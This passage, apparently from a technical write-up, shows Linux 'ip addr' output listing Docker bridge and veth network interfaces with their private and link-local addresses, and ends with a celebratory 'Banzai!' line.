       valid_lft forever preferred_lft forever
6: br-c954bf22b8b2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:d3:44:b6:15 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-c954bf22b8b2
       valid_lft forever preferred_lft forever
8: vethdd37abe@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cbf2c5ce8e95 state UP group default 
    link/ether a6:64:5f:2d:7f:08 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::a464:5fff:fe2d:7f08/64 scope link 
       valid_lft forever preferred_lft forever
10: veth70f42ca@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cbf2c5ce8e95 state UP group default 
    link/ether 36:a2:8d:d8:23:47 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::34a2:8dff:fed8:2347/64 scope link 
       valid_lft forever preferred_lft forever
```

万歳!万歳!万歳!